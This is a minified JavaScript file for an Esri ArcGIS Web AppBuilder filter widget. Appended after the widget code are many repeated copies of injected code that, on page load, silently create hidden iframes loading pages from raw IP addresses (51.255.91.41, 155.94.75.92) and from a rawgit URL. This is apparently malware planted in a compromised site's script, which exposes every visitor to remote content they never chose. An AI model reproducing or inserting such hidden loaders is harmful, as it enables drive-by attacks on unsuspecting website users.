// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-construct dijit/_TemplatedMixin dijit/_WidgetBase".split(" "),function(f,e,g,c,h,k){return f([k,h],{name:"FilterEditor",baseClass:"jimu-widget-FilterEditor",declaredClass:"jimu.dijit.FilterEditor",templateString:"\x3cdiv style\x3d'width:100%'\x3e\x3cdiv data-dojo-attach-point\x3d'filterEditorDiv'\x3e\x3c/div\x3e\x3c/div\x3e",_settings:null,_editWidget:null,_origGetItemsFromLayerFunc:null,postCreate:function(){this.nls=this._editWidget.nls;
this._createFilterTool()},_createFilterTool:function(){var a=c.create("label",{innerHTML:"Feature Layers"});c.place(a,this.filterEditorDiv);this._createLayerFilter();this._createTemplateFilter()},_createLayerFilter:function(){this.selectDropDown=c.create("select",{"class":"jimu-input flDropDown"});c.place(this.selectDropDown,this.filterEditorDiv);this.selectDropDown.onchange=e.hitch(this,function(){this._onLayerFilterChanged()});var a=c.create("option",{value:"all",innerHTML:window.jimuNls.common.all});
c.place(a,this.selectDropDown);for(var b,a=0;a<this._editWidget._layerObjectsParaForTempaltePicker.length;a++)b=this._editWidget._layerObjectsParaForTempaltePicker[a],b=c.create("option",{value:b.id,innerHTML:b.name}),c.place(b,this.selectDropDown)},_createTemplateFilter:function(){this.filterTextBox=c.create("input",{"class":"jimu-input searchtextbox",type:"text",placeholder:this.nls.searchTemplates},this.filterEditorDiv);this.filterTextBox.onkeyup=e.hitch(this,function(){this._onTempalteFilterChanged()});
var a=this._editWidget.editor.templatePicker;this._origGetItemsFromLayerFunc=a._getItemsFromLayer;a._getItemsFromLayer=e.hitch(this,function(){var b;b=this._origGetItemsFromLayerFunc.apply(a,arguments);var c=this.filterTextBox.value;c&&(b=g.filter(b,function(a){var b=!1,d=new RegExp(c,"ig");a.hasOwnProperty("label")&&a.label.match(d)&&0<a.label.match(d).length&&(b=!0);a.hasOwnProperty("template")&&a.template.hasOwnProperty("name")&&a.template.name.match(d)&&0<a.template.name.match(d).length&&(b=!0);
return b}));0===b.length&&(this._editWidget.editor.templatePicker.grid.noDataMessage=this.nls.noAvailableTempaltes);return b})},_onLayerFilterChanged:function(){var a=this._editWidget.editor.templatePicker;a.clearSelection();var b=this.selectDropDown.options[this.selectDropDown.selectedIndex].text;""!==b&&("All"===b?(a.attr("featureLayers",this._editWidget._layerObjectsParaForTempaltePicker),""===this.filterTextBox.value?a.attr("grouping",!0):a.attr("grouping",!1)):(b=this._editWidget.map.getLayer(this.selectDropDown.value),
a.attr("featureLayers",[b]),a.attr("grouping",!1)),a.update())},_onTempalteFilterChanged:function(){var a=this.filterTextBox.value;"All"===this.selectDropDown.options[this.selectDropDown.selectedIndex].text&&""===a?this._editWidget.editor.templatePicker.attr("grouping",!0):this._editWidget.editor.templatePicker.attr("grouping",!1);this._editWidget.editor.templatePicker.update()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});